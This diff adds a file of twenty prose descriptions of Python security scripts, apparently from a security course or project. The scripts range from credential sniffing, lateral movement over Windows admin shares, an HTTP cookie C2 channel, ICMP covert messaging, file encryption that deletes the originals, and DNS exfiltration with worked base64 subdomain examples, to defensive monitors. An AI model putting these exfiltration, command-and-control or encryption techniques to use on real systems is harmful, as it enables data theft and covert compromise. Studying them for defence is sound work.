@@ -1,0 +1,250 @@
+1.
+This network sniffing script captures and analyzes network traffic to extract sensitive information such as FTP, SMTP, and Telnet credentials. It reads a PCAP file, checks packets for specific ports, and uses pattern matching to identify and print usernames and passwords. For FTP, it looks for "USER" and "PASS" commands; for SMTP, it decodes base64-encoded data to find email addresses and associated passwords; for Telnet, it identifies login and password prompts. This demonstrates how attackers can intercept and retrieve sensitive data from unencrypted network communications, emphasizing the need for secure, encrypted protocols. Usage involves specifying the PCAP file and the ports to monitor.
+
+2.
+
+This script searches a specified directory for files containing email addresses, phone numbers, and Social Security Numbers (SSNs). It uses regular expressions to identify PII within text and .docx files. For .docx files, it extracts and reads the XML content to find matches. For text files, it reads the content directly. The script prints the file paths and any PII matches it finds, aiding in identifying and securing sensitive information in various file types. Usage involves specifying the directory and file types as command-line arguments.
+
+
+3.
+The attack leverages administrative shares on a Windows machine to gain unauthorized access and execute a malicious script. By modifying the system registry, the attacker enables the LocalAccountTokenFilterPolicy, which allows the use of administrative shares. The attacker then maps the remote machine's C$ share, transfers the malicious script to the target machine, and executes it, potentially compromising the system. This method exploits administrative privileges to bypass normal security measures and can be used to deploy malware or other harmful actions on the target system.
+
+4.
+
+This mechanism establishes a secure communication channel between a client and a server using AES encryption. The server script listens for incoming connections on a specified host and port, accepting connections and decrypting received data using AES in CBC mode. It expects an initialization vector (IV) and an encrypted message length byte before receiving the actual encrypted data. The client script connects to the server, generates a random IV, and sends it along with the encrypted message. The message is padded to ensure its length is a multiple of 16 bytes, and the length byte is sent to inform the server of the message's original size. Both scripts require a key of 16, 24, or 32 bytes to ensure proper AES encryption and decryption. This approach ensures data confidentiality during transmission by encrypting the message before sending and decrypting it upon receipt.
+
+5.
+
+The provided scripts demonstrate a basic client-server communication setup using HTTP and base64 encoding for protocol tunneling. The server script (C2Server) creates an HTTP server that listens for GET requests, decodes a base64-encoded string from the "Cookie" header, and responds with a base64-encoded "Received" message unless the decoded data is "d", in which case it sends a 404 error. The client script (C2) encodes data in base64, sends it to a specified URL via a GET request with the encoded data in the "Cookie" header, and decodes the server's base64-encoded response. This setup allows custom data to be transmitted over HTTP, encapsulating the communication protocol within standard web traffic.
+
+Start the Server:
+
+Run the server script:
+sh
+Copy code
+python server_script.py
+The server starts and listens for incoming requests on http://localhost:8440.
+Client Sends Data:
+
+Run the client script with different commands:
+sh
+Copy code
+python client_script.py http://localhost:8440 hello
+Detailed Steps:
+
+Server Initialization:
+
+The server starts and waits for GET requests.
+Client Request:
+
+The client encodes the command "hello" to Base64:
+rust
+Copy code
+"hello" -> "aGVsbG8="
+The client sends a GET request to http://localhost:8440 with the header:
+makefile
+Copy code
+Cookie: aGVsbG8=
+Server Handling:
+
+The server receives the GET request and extracts the Cookie header.
+It decodes the Base64 string:
+rust
+Copy code
+"aGVsbG8=" -> "hello"
+The server determines the response based on the command:
+rust
+Copy code
+"hello" -> "Hello, client!"
+The server encodes the response message to Base64:
+rust
+Copy code
+"Hello, client!" -> "SGVsbG8sIGNsaWVudCE="
+The server sends the encoded response back to the client.
+Client Response:
+
+The client receives the response and decodes the Base64 string:
+rust
+Copy code
+"SGVsbG8sIGNsaWVudCE=" -> "Hello, client!"
+The client prints the decoded response:
+Copy code
+Hello, client!
+Summary
+By following the above steps, you can observe how the client-server interaction works with Base64 encoding and decoding to send and receive messages. This mechanism ensures that the data transmitted is encoded in a way that can be easily handled and interpreted by both the client and the server.
+
+6.
+
+The given code consists of two Python scripts using Scapy, a packet manipulation library, to demonstrate a basic form of covert communication using ICMP (Internet Control Message Protocol) echo requests and replies, commonly known as ping messages.
+
+The server script listens for incoming ICMP packets with a type of 8 (indicating an echo request) using the sniff function. When such a packet is detected, it extracts a character from the code field of the ICMP header and prints it as a message. The client script sends ICMP packets to a specified host, where each packet contains a single character of the message to be transmitted, encoded in the code field of the ICMP header. This mechanism allows the client to send messages to the server covertly by embedding the message characters in the ICMP packets, which the server then decodes and displays.
+
+7.
+
+The provided scripts implement file encryption and decryption using AES (Advanced Encryption Standard) in CBC (Cipher Block Chaining) mode with PKCS#7 padding. The first script, an encryption script, takes a key, a directory, and a file extension as command-line arguments, retrieves all files with the specified extension from the given directory, encrypts their contents, and saves the encrypted data with an ".encrypted" extension, then deletes the original files. The second script, a decryption script, takes a key and a directory as command-line arguments, retrieves all files with the ".encrypted" extension from the given directory, decrypts their contents using the same key and a generated IV (Initialization Vector), saves the decrypted data back to their original filenames, and deletes the encrypted files.
+
+8.
+
+
+The script verifies the integrity of decoy files by checking their timestamps. It reads a decoys.txt file containing filenames and their expected creation, modification, and access times. For each file listed, it retrieves the actual timestamps using the pathlib module and compares them to the expected values. If any discrepancies are found, it indicates that the file has been tampered with.
+
+
+
+9.
+
+This script simulates user traffic by making random HTTP GET requests to URLs from a provided list, with configurable chances and delays to act like real browsing. It helps check how well a website performs under normal and heavy traffic. The script tests rate-limiting, which prevents abuse by limiting the number of requests a user can make in a set time. By creating lots of traffic, the script can find weaknesses that might lead to denial-of-service (DoS) attacks, showing how well the site handles many requests at once. These tests help security experts improve defenses, making the site stronger and better at handling traffic and potential attacks. This overall approach boosts the website's stability, security, and user experience.
+
+10.
+
+
+This tool analyzes network traffic from a packet capture (pcap) file to determine the volume of data exchanged between pairs of IP addresses. It reads the pcap file, examines each packet to extract its length and the source and destination IP addresses, and creates a unique key for each flow based on these addresses. The tool updates a dictionary with the total byte counts sent in each direction for every unique flow. Finally, it outputs a summary of the data exchanged between each pair of IP addresses, providing insights into the network traffic patterns and data volumes.
+
+
+11.
+
+
+This Python script monitors network connections of running processes using the psutil library. It first establishes a baseline by tracking each process's network connection behavior over a specified time period. The script then compares the current network connections against this baseline. If a process's network connection behavior deviates significantly from the baseline, as determined by a user-defined probability threshold, it prints a warning. This monitoring can help detect unusual or potentially malicious network activity by identifying processes that behave unexpectedly.
+
+
+12.
+
+This script processes an Outlook PST file to extract and display email information. It begins by handling command-line arguments to allow the user to specify the path to the PST file. The script then opens and reads the PST file, iterating through its folders to check for any emails. For each email found, it prints the sender's name, the subject, and the plain text body of the message. It ensures that the file path format is compatible with Windows systems
+
+
+13.
+
+
+
+This Python script monitors the clipboard for sensitive information, such as emails, phone numbers, URLs, dates, IP addresses, credit card numbers, and Social Security numbers. Using regular expressions to detect these types of data, the script replaces any detected sensitive information with a user-defined replacement value. It continuously runs in the background, checking the clipboard content every second, and updates the clipboard when necessary. 
+
+
+
+14.
+
+This Python script uses the wmi library to identify and display information about user accounts on a Windows device. It retrieves a list of administrator accounts and iterates through all user accounts to print details such as whether each user is an administrator, if the account is disabled, if it is a local account, and various password policies. Additionally, the script prints the system's password policy by executing the net accounts command. This overview helps system administrators manage and audit user accounts and security settings effectively.
+
+
+
+
+15.
+
+
+
+This script provides a proof-of-concept for data exfiltration using DNS requests. The client script initiates the process by taking the data to be exfiltrated, splitting it into chunks of 10 characters each, and encoding these chunks in base64 to ensure safe transmission over DNS. Each encoded chunk is then appended as a subdomain to a specified domain, creating a series of DNS query packets. These packets are sent to a target IP address on a specified port using UDP. After all data chunks have been transmitted, the client sends an "R" signal to indicate the end of transmission.
+
+On the server side, a script continuously listens for DNS packets on port 1337. Upon receiving a DNS packet, the server extracts the subdomain, decodes the base64 data, and accumulates the decoded chunks into a complete message. If the server receives the "R" signal, it prints the entire accumulated message and resets the process for future transmissions. Throughout the process, the server sends back DNS responses to the client with specific IP addresses to indicate the status of each received packet: successful receipt, end of transmission, or transmission error. This setup effectively demonstrates how data can be covertly encoded, transmitted, and reconstructed using DNS queries, highlighting a potential method for stealthy data transfer over a network.
+
+
+
+Data Preparation:
+
+Suppose you want to exfiltrate the message "Hello, this is a secret message".
+The message is split into chunks of 10 characters each: "Hello, thi", "s is a sec", "ret messa", "ge".
+Base64 Encoding:
+
+Each chunk is encoded in base64:
+"Hello, thi" -> "SGVsbG8sIHRo"
+"s is a sec" -> "cyBpcyBhIHNl"
+"ret messa" -> "cmV0IG1lc3M="
+"ge" -> "Z2U="
+The trailing '=' characters are removed.
+DNS Query Construction:
+
+Each encoded chunk is used as a subdomain in a DNS query.
+If the domain is "example.com", the queries become:
+"SGVsbG8sIHRo.example.com"
+"cyBpcyBhIHNl.example.com"
+"cmV0IG1lc3M.example.com"
+"Z2U.example.com"
+Sending Packets:
+
+These DNS queries are sent to the server's IP address (e.g., 192.168.1.100) on port 1337.
+After sending all data chunks, an "R" signal is sent as "R.example.com" to indicate the end of transmission.
+Server Script:
+Packet Sniffing:
+
+The server listens for DNS queries on port 1337.
+Data Extraction:
+
+When a DNS query is received, the server extracts the subdomain and decodes the base64 data:
+"SGVsbG8sIHRo" -> "Hello, thi"
+"cyBpcyBhIHNl" -> "s is a sec"
+"cmV0IG1lc3M" -> "ret messa"
+"Z2U" -> "ge"
+Data Accumulation:
+
+The server accumulates these decoded chunks into the complete message: "Hello, this is a secret message".
+End Signal Handling:
+
+Upon receiving the "R" signal, the server prints the complete accumulated message and resets for the next transmission.
+Example Execution:
+Client Command:
+
+bash
+Copy code
+python client_script.py 192.168.1.100 example.com "Hello, this is a secret message" 1337
+Server Command:
+
+bash
+Copy code
+python server_script.py
+Execution Flow:
+Client-Side:
+
+The client sends the encoded data chunks as DNS queries:
+"SGVsbG8sIHRo.example.com"
+"cyBpcyBhIHNl.example.com"
+"cmV0IG1lc3M.example.com"
+"Z2U.example.com"
+After sending all data chunks, the client sends "R.example.com" to signal the end of transmission.
+Server-Side:
+
+The server captures these DNS queries and extracts the subdomains.
+It decodes each subdomain from base64 and accumulates the resulting data:
+"SGVsbG8sIHRo" -> "Hello, thi"
+"cyBpcyBhIHNl" -> "s is a sec"
+"cmV0IG1lc3M" -> "ret messa"
+"Z2U" -> "ge"
+When the "R" signal is received, the server prints the complete message: "Hello, this is a secret message".
+
+
+
+16.
+
+This script is designed to change the password of a user on a computer, either on Windows or Linux systems, based on specific criteria. The script begins by importing necessary modules for platform identification and password manipulation. It defines two functions, setWindowsPassword and setLinuxPassword, which set the user's password for Windows and Linux, respectively. Another function, changeCriteria, checks if the username matches certain predefined values ("testuser", "user1", "FYP"). The main function, main, first determines the operating system. If it's Windows, it uses the WMI library to find the user and change the password if the username meets the criteria. For Linux, it uses the pwd module to find the user and the os.system function to change the password if the criteria are met. 
+
+
+
+17.
+
+This Python script reads Windows event logs to identify and count occurrences of a specific event ID, focusing on administrative logins. Using the win32evtlog module, it accesses and reads event logs from a specified server, filtering for events with the given ID (default is 4672, indicating special privileges assigned to new logon). It checks if the event's account is a security principal and counts the occurrences for each account. The tool take user input to specify the server, log type, and event ID. The results are printed, showing the number of times each account logged in with administrative rights or privileges.
+
+
+
+
+18.
+
+This Python script is a straightforward port scanner designed to check if specific well-known ports are open on a target host. It begins by defining a list of common ports along with their associated services. The script uses the socket module to resolve the target host's IP address and then attempts to connect to each port to determine its status. For each port, the scan_port function tries to establish a TCP connection; if successful, it indicates the port is open, otherwise, it is considered closed
+
+
+19.
+
+This Python script detects the operating system of a target host by analyzing the Time-to-Live (TTL) value in its ICMP (ping) responses. It leverages the scapy library to construct and send an ICMP packet to the specified target IP address. The user provides the target IP address via command-line arguments, which are parsed using the argparse module. Once the ICMP packet is sent, the script waits for a response. If a response is received, the script retrieves the TTL value from the IP layer of the response packet. A TTL value of 64 or less usually indicates a Linux-based system, while a TTL value greater than 64 suggests a Windows-based system. If no response is received within the specified timeout, the script informs the user. This tool provides a simple yet effective method for identifying the operating system of a target host based on its network response characteristics, which can be useful for network diagnostics and security assessments.
+
+
+
+20.
+
+
+
+This Python script performs an ARP (Address Resolution Protocol) scan to discover devices on a specified network. Using the scapy library, it sends ARP requests to the target IP address or IP range provided by the user through command-line arguments. The script constructs ARP requests, broadcasts them over the network, and collects responses from devices that reply. Each response includes the IP and MAC addresses of the responding devices, which are stored in a list. The script handles command-line arguments with the argparse module, allowing users to specify the target IP range and an optional timeout for the ARP requests. The results are then printed in a formatted table, showing the IP and MAC addresses of the discovered devices. If no devices are found or an error occurs, appropriate messages are displayed using the termcolor library for colored output. This tool is useful for network discovery and monitoring, providing a simple way to identify devices on a local network.
+
+
+
+
+
+
+
+
+
+
